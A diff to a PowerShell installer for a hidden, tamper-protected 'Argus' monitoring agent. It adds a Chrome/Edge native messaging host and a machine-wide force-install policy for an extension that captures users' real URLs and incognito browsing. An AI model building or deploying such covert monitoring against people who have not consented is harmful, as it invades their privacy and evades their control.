@@ -61,4 +61,41 @@ sc.exe sdset $svc "D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPDTLOCRS
 Start-Service $svc
 Write-Host "Argus agent SERVICE kuruldu ve başladı (self-contained, gizli, tamper korumalı)." -ForegroundColor Green
 Write-Host "  Sunucu : $ServerUrl"
-Write-Host "Tarayıcı eklentisi (gerçek URL/gizli mod) için: install-webhost.ps1 (README)."
+
+# ===== TARAYICI EKLENTİSİ — gerçek URL + gizli mod (otomatik) =====
+# Sabit uzantı ID'si (CRX imza anahtarından türer; build-extension.ps1 ile aynı).
+$extId = "nchclcmnnndflmefplbjbggdoekihkin"
+$updateUrl = "$($ServerUrl.TrimEnd('/'))/ext/update.xml"
+
+# 1) webhost köprüsü (native messaging host) — makine geneli (HKLM), Chrome + Edge.
+$whSrc = "$PSScriptRoot\webhost"
+if (Test-Path "$whSrc\Argus.WebHost.exe") {
+    $whDir = "$installDir\webhost"
+    New-Item -ItemType Directory -Force $whDir | Out-Null
+    Copy-Item "$whSrc\*" $whDir -Recurse -Force
+    $hostName = "com.argus.webhost"
+    $manifest = "$whDir\$hostName.json"
+    @{ name = $hostName; description = "Argus Web Host"; path = "$whDir\Argus.WebHost.exe"; type = "stdio";
+       allowed_origins = @("chrome-extension://$extId/") } | ConvertTo-Json | Set-Content $manifest -Encoding utf8
+    foreach ($base in @("HKLM:\Software\Google\Chrome\NativeMessagingHosts",
+                        "HKLM:\Software\Microsoft\Edge\NativeMessagingHosts")) {
+        New-Item -Path "$base\$hostName" -Force | Out-Null
+        Set-ItemProperty -Path "$base\$hostName" -Name "(default)" -Value $manifest
+    }
+    Write-Host "  Tarayıcı köprüsü kuruldu (native host)." -ForegroundColor DarkGray
+}
+
+# 2) Eklentiyi ZORUNLU kur (HKLM policy) — domain makinede Chrome/Edge sunucudan otomatik kurar.
+foreach ($base in @("HKLM:\Software\Policies\Google\Chrome", "HKLM:\Software\Policies\Microsoft\Edge")) {
+    $key = "$base\ExtensionInstallForcelist"
+    New-Item -Path $key -Force | Out-Null
+    $props = Get-Item $key
+    $already = $false
+    foreach ($p in $props.Property) { if ((Get-ItemProperty -Path $key -Name $p).$p -like "$extId;*") { $already = $true } }
+    if (-not $already) {
+        $idx = 1; while ($props.Property -contains "$idx") { $idx++ }
+        Set-ItemProperty -Path $key -Name "$idx" -Value "$extId;$updateUrl"
+    }
+}
+Write-Host "  Eklenti force-install policy yazıldı (Chrome+Edge). Tarayıcı kapat-aç → otomatik kurulur." -ForegroundColor DarkGray
+Write-Host "Kurulum tamam. Gerçek URL için kullanıcı tarayıcısını bir kez kapatıp açmalı." -ForegroundColor Green
